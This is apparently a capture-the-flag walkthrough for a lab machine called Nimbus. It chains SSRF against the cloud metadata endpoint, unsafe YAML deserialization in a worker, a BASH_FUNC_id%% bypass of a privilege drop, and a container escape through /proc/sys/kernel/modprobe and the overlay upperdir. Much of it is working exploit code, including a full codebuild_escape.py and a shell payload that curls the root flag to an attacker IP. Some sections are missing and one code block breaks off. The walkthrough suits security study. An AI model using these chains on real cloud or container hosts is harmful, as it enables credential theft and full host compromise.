// 01

Machine Overview

Nimbus simulates a cloud-native deployment: a Flask job-submission service backed by a containerised Python worker and a fully-functional fake AWS stack (LocalStack). The kill chain traverses four distinct attack primitives — SSRF to steal IMDS credentials, unsafe YAML deserialization for worker RCE, a LocalStack CodeBuild privileged container, and a kernel usermode-helper escape via /proc/sys/kernel/modprobe + overlay upperdir — to achieve execution as host root without ever having a direct shell on the host.

◈
Full Kill Chain: SSRF on Flask URL-fetch field → IMDS at 169.254.169.254 leaks ASIA creds for nimbus-web-role → SendMessage to SQS queue with malicious YAML → yaml.load(Loader=yaml.Loader) + script subprocess RCE as worker (uid=1000) → boto3 to floci:4566 LocalStack (ENFORCE_IAM=false, x/x auth) → CodeBuild privileged container with BASH_FUNC_id%% bypass → write /tmp/pwn.sh via overlay upperdir → echo upperdir path to /proc/sys/kernel/modprobe → trigger via unknown magic binary → HOST root executes script → root flag exfiltrated.

Recon & Enumeration

01
Nmap + Web Enumeration
Reconnaissance · Phase 01

Full port scan reveals only SSH and HTTP. nginx proxies nimbus.htb (Flask job service) and aws.nimbus.htb (LocalStack API). Directory brute-forcing reveals a /jobs endpoint that accepts a "Raw Git URL" field — the attack entry point. The preview endpoint (/jobs/preview) renders a page but never actually submits to SQS.

bash
nmap --privileged -sCV -p22,80 10.129.1.129
22/tcp open ssh  OpenSSH 9.6p1 Ubuntu
80/tcp open http nginx 1.24.0 → nimbus.htb

echo "10.129.1.129 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts

feroxbuster -u http://nimbus.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
output — key endpoints
/jobs          GET/POST  Job submission — accepts URL or raw YAML
/jobs/preview  POST      Preview only (never queues to SQS)
/api/v1/health GET       App health
◈
Key Finding: The /jobs "Raw Git URL" field fetches a remote URL server-side and parses the YAML. No RFC-1918 or link-local filtering — this is the SSRF entry point.

SQS YAML Injection — Worker RCE

04
Discover Vulnerable worker.py via S3
Worker RCE · Phase 04

Using the ASIA credentials, enumerate the LocalStack SQS API via the nginx proxy at aws.nimbus.htb. The queue URL is found in the listing. The S3 bucket nimbus-dev-artifacts contains the worker source, revealing two chained vulnerabilities.

bash — enumerate SQS queue
aws sqs list-queues \
  --endpoint-url http://aws.nimbus.htb \
  --region us-east-1
QueueUrl: http://aws.nimbus.htb/847219365028/nimbus-jobs
python3 — worker.py vulnerable code (from S3)
def handle_message(body):
    # Vulnerability 1: yaml.Loader = full deserialization, not SafeLoader
    job = yaml.load(body, Loader=yaml.Loader)
    if not isinstance(job, dict): return
    script = job.get("script", "")
    if script:
        # Vulnerability 2: script value passed directly to python3 -c
        result = subprocess.run(
            ["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
✕
Double Vulnerability: (1) yaml.load(Loader=yaml.Loader) allows !!python/object/apply tags for arbitrary deserialization. (2) The script field is passed verbatim to python3 -c — any Python code executes as the worker user.
05

Worker RCE · Phase 05

The worker's own long-term credentials (AKIA7P3R9X4K8M2L5VHN) are scoped to sqs:ReceiveMessage and sqs:DeleteMessage only — not SendMessage. The stolen ASIA session credentials from IMDS include SendMessage. Use them to inject the malicious YAML job body.

    aws_secret_access_key="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
    aws_session_token="IQoJb3JpZ2luX2VjEHQa...")

import urllib.request, os
uid = os.popen("id").read().strip()
urllib.request.urlopen(
    urllib.request.Request("http://{KALI}:{PORT}/RCE",

07
BASH_FUNC_id%% — Entrypoint Privilege-Drop Bypass
CodeBuild · Phase 07

The floci/floci:latest CodeBuild image has an entrypoint that checks $(id -u) and drops to a non-root user if it returns 0. Bash imports environment variables named BASH_FUNC_<name>%% as shell functions, silently overriding external binaries. Injecting a fake id function makes the comparison "uid=0(root) gid=0(root) groups=0(root)" = "0" evaluate false — the privilege drop is skipped and the build runs as the container's actual user: root.

bash — entrypoint logic (simplified)
# Entrypoint checks id -u and drops if == 0
if [ "$(id -u)" = "0" ]; then
    exec su-exec codebuild "$@"   ← privilege drop
fi
exec "$@"   ← already non-root, proceed as-is
json — BASH_FUNC bypass env var
{
  "name":  "BASH_FUNC_id%%",
  "value": "() { echo uid=0(root) gid=0(root) groups=0(root); }",
  "type":  "PLAINTEXT"
}
# id -u now returns the full string "uid=0(root)..."
# Comparison: "uid=0(root) gid=0(root) groups=0(root)" = "0" → FALSE
# → su-exec branch skipped → build runs as actual uid=0
✕
BASH_FUNC Override: Bash's function export mechanism (BASH_FUNC_name%%) imports environment variables as shell functions, silently replacing external binaries. The entrypoint's string comparison = "0" fails because the spoofed id returns the full uid=... string — bypassing the privilege drop entirely.
// 06

Container Escape — modprobe + Overlay Upperdir

08
The Escape Technique
Container Escape · Phase 08

In a --privileged container, CAP_SYS_ADMIN is available and /proc/sys/kernel/modprobe reflects the host kernel's sysctl — writing to it changes the binary the kernel invokes for module loading. The kernel calls this path as host root, outside any container namespace. The challenge: the path must be accessible from the host filesystem. The solution: the container's overlay upperdir — any file written inside the container appears on the host at <upperdir>/<path>.

escape chain
# 1. Read overlay upperdir from /proc/mounts
UPPER=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -1 | cut -d= -f2)

# 2. Write payload to /tmp/pwn.sh inside container
#    → appears at ${UPPER}/tmp/pwn.sh on HOST
printf '#!/bin/sh\nFLAG=$(cat /root/root.txt)\ncurl -X POST --data-binary "$FLAG" http://10.10.14.125:8009/ROOT\n' > /tmp/pwn.sh
chmod 777 /tmp/pwn.sh

# 3. Write host-side path to kernel modprobe sysctl
echo ${UPPER}/tmp/pwn.sh > /proc/sys/kernel/modprobe

# 4. Trigger: execute binary with unrecognised magic number
#    → kernel binfmt_misc misses → calls request_module()
#    → kernel runs our script as HOST ROOT
printf '\xff\xff\xff\xff' > /tmp/unkn; chmod 0755 /tmp/unkn; /tmp/unkn 2>/dev/null
✕
Overlay Upperdir Bridge: Container overlay filesystems use a host-side directory (upperdir) for all writes. A file written at /tmp/pwn.sh inside the container is immediately accessible at <upperdir>/tmp/pwn.sh from the host. This provides the shared-path bridge needed for the modprobe escape without mounting any host filesystem.
09
Full Exploit — One SQS Job
Container Escape · Phase 09

The entire exploit is delivered as a single SQS job (Python RCE inside the worker), which calls CodeBuild via floci:4566. The buildspec decodes and executes the escape shell payload. The BASH_FUNC bypass ensures the build runs as container root (uid=0). The modprobe write triggers host root execution.

python3 — codebuild_escape.py (delivered via SQS RCE)
import boto3, base64

INT   = "http://floci:4566"
EXFIL = "http://10.10.14.125:8009"

cbc = boto3.client("codebuild", endpoint_url=INT, region_name="us-east-1",
    aws_access_key_id="x", aws_secret_access_key="x")

# Shell payload — base64-encoded to avoid YAML/Python quoting issues
shell = (
    "UPPER=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -1 | cut -d= -f2); "
    "printf '#!/bin/sh\\nFLAG=$(cat /root/root.txt)\\n"
    f"curl -X POST --data-binary \\\"$FLAG\\\" {EXFIL}/ROOT_CB_ESCAPE\\n' "
    "" > /tmp/pwn.sh; "
    "chmod 777 /tmp/pwn.sh; "
    "echo ${UPPER}/tmp/pwn.sh > /proc/sys/kernel/modprobe; "
    "printf '\\xff\\xff\\xff\\xff' > /tmp/unkn && chmod 0755 /tmp/unkn; "
    "/tmp/unkn 2>/dev/null || true; sleep 3"
)
b64 = base64.b64encode(shell.encode()).decode()

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - echo {b64} | base64 -d | bash"""

env_vars = [{
    "name":  "BASH_FUNC_id%%",
    "value": "() { echo uid=0(root) gid=0(root) groups=0(root); }",
    "type":  "PLAINTEXT"
}]

cbc.create_project(
    name="nimbus-root-escape",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": env_vars,
    },
    serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
)
cbc.start_build(projectName="nimbus-root-escape",
                environmentVariablesOverride=env_vars)

POST /cb_start            nimbus-root-escape:1
POST /ROOT_CB_ESCAPE      ← root flag delivered by HOST kernel
✓

key takeaways
// 01
SSRF Filters Must Include 169.254.0.0/16
Flask's URL-fetch field had no SSRF protection. Any application that fetches user-supplied URLs must block RFC-1918 (10/8, 172.16/12, 192.168/16), link-local (169.254/16), loopback (127/8), and IPv6 equivalents. The IMDS endpoint 169.254.169.254 is the highest-value SSRF target in any cloud environment.
// 02
yaml.load(Loader=yaml.Loader) Is Unsafe by Design
yaml.Loader supports !!python/object/apply tags that execute arbitrary Python during deserialization. Any YAML loaded from untrusted input must use yaml.safe_load(). Combined with the script → subprocess.run path, this created a trivially weaponisable RCE primitive.
// 03
BASH_FUNC%% Bypasses Entrypoint UID Checks
Bash imports environment variables matching BASH_FUNC_name%% as shell functions, silently overriding external binaries. Entrypoints using $(id -u) as a security check are bypassable by anyone who can inject environment variables. Container entrypoints must use numeric UID checks against /proc/self/status, not external binary output.
// 04
Overlay Upperdir Bridges Container and Host Filesystems
Container overlay filesystems expose every container write on the host at the upperdir path. In a privileged container, this provides a reliable host-path reference for any file written inside the container — no volume mount required. Combined with a host-kernel sysctl write, it completes the escape chain.
// 05
/proc/sys/kernel/modprobe Must Be Immutable in Privileged Containers
Writing to /proc/sys/kernel/modprobe from a privileged container overwrites the host kernel's usermode helper — any binary the kernel calls for module loading, executed as host root outside all namespaces. Privileged containers must be avoided; if required, seccomp must block sysctl writes and AppArmor must restrict /proc/sys/kernel/ writes.
// 06
LocalStack in Production Posture Requires IAM Enforcement
ENFORCE_IAM=false means any credential pair is accepted for all API calls — a trivial bypass of all access control. LocalStack deployments that are network-accessible (even internally) must run with ENFORCE_IAM=true and properly scoped IAM policies to prevent lateral movement from any compromised workload.
